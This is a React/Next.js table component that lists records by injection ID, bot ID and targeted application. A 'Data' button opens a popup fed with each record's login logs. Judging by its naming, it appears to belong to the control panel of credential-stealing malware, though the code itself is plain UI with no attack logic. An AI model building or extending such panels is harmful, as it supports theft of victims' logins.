import PropTypes from 'prop-types';
import { useState } from "react";
import Popup from './popup';
import $ from 'jquery';
import {
  Dialog,
  DialogTitle,
  DialogContent,
  DialogContentText,
  DialogActions,
  Avatar,
  Box,
  Card,
  Checkbox,
  SvgIcon,
  Button,
  Stack,
  Table,
  TableBody,
  TableCell,
  TableHead,
  TablePagination,
  TableRow,
  Typography
} from '@mui/material';
import { Scrollbar } from 'src/components/scrollbar';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faKey, faUsd, faUser } from '@fortawesome/free-solid-svg-icons';
import Link from 'next/link';

  
export const CustomersTable = (props) => {
  const {
    count = 0,
    items = [],
    onDeselectAll,
    onDeselectOne,
    onPageChange = () => {},
    onRowsPerPageChange,
    onSelectAll,
    onSelectOne,
    page = 0,
    rowsPerPage = 0,
    selected = [],
  } = props;

  const [openPopup, setOpenPopup] = useState(false);
  const [selectedId, setSelectedId] = useState(null);
  const selectedSome = (selected.length > 0) && (selected.length < items.length);
  const selectedAll = (items.length > 0) && (selected.length === items.length);

    const openinfodialog = (id, index) => {
      setSelectedId(id);
      setOpenPopup(true);
    }

    const handlePopupClose = () => {
      setSelectedId(null);
      setOpenPopup(false);
    };

    return (
      <Card>
        <Scrollbar>
          <Box sx={{ minWidth: 800 }}>
            <Table>
              <TableHead>
                <TableRow>
                  <TableCell padding="checkbox">
                    <Checkbox
                      checked={selectedAll}
                      indeterminate={selectedSome}
                      onChange={(event) => {
                        if (event.target.checked) {
                          onSelectAll?.();
                        } else {
                          onDeselectAll?.();
                        }
                      }}
                    />
                  </TableCell>
                  <TableCell>
                    ID
                  </TableCell>
                  <TableCell>
                    Bot
                  </TableCell>
                  <TableCell>
                    Application
                  </TableCell>
                  <TableCell>
                    Info
                  </TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {items.map((customer) => {
                  const isSelected = selected.includes(customer.idinj);

                  return (
                    <TableRow
                      hover
                      key={customer.idinj}
                      selected={isSelected}
                    >
                      <TableCell padding="checkbox">
                        <Checkbox
                          checked={isSelected}
                          onChange={(event) => {
                            if (event.target.checked) {
                              onSelectOne?.(customer.idinj);
                            } else {
                              onDeselectOne?.(customer.idinj);
                            }
                          }}
                        />
                      </TableCell>
                      <TableCell>
                        <Stack
                          alignItems="center"
                          direction="row"
                          spacing={2}
                        >
                          <Typography variant="subtitle2">
                            {customer.idinj}
                          </Typography>
                        </Stack>
                      </TableCell>
                      <TableCell>
                      <Link  href={"/bots?botid=" + customer.idbot} style={{ textDecoration: 'none' }}>
                        <Button
                        style={{width: "200px"}}
                        startIcon={(
                          <SvgIcon fontSize="small">
                            <FontAwesomeIcon icon={faUser}/>
                          </SvgIcon>
                        )}
                        variant="contained"
                        >
                        {customer.idbot}
                        </Button>
                      </Link>
                      </TableCell>
                      <TableCell>
                        {customer.application}
                      </TableCell>
                      <TableCell>
                      <div>
                      <Button onClick={() => openinfodialog(customer.idinj)}
                      startIcon={(
                        <SvgIcon fontSize="small">
                          <FontAwesomeIcon icon={faKey}/>
                        </SvgIcon>
                      )}
                      variant="contained"
                      >
                      Data
                      </Button>
                      <Popup
                      title={customer.idbot}
                      customer={customer}
                      login-info={customer.logs}
                      openPopup={selectedId === customer.idinj && openPopup}
                      setOpenPopup={setOpenPopup}
                      onClose={handlePopupClose}>
                      </Popup>
                  </div>
                      </TableCell>
                    </TableRow>
                  );
                })}
              </TableBody>
            </Table>
          </Box>
        </Scrollbar>
        <TablePagination
          component="div"
          count={count}
          onPageChange={onPageChange}
          onRowsPerPageChange={onRowsPerPageChange}
          page={page}
          rowsPerPage={rowsPerPage}
          rowsPerPageOptions={[10, 100, 300]}
        />
      </Card>
    );
  }


CustomersTable.propTypes = {
  count: PropTypes.number,
  items: PropTypes.array,
  onDeselectAll: PropTypes.func,
  onDeselectOne: PropTypes.func,
  onPageChange: PropTypes.func,
  onRowsPerPageChange: PropTypes.func,
  onSelectAll: PropTypes.func,
  onSelectOne: PropTypes.func,
  page: PropTypes.number,
  rowsPerPage: PropTypes.number,
  selected: PropTypes.array
};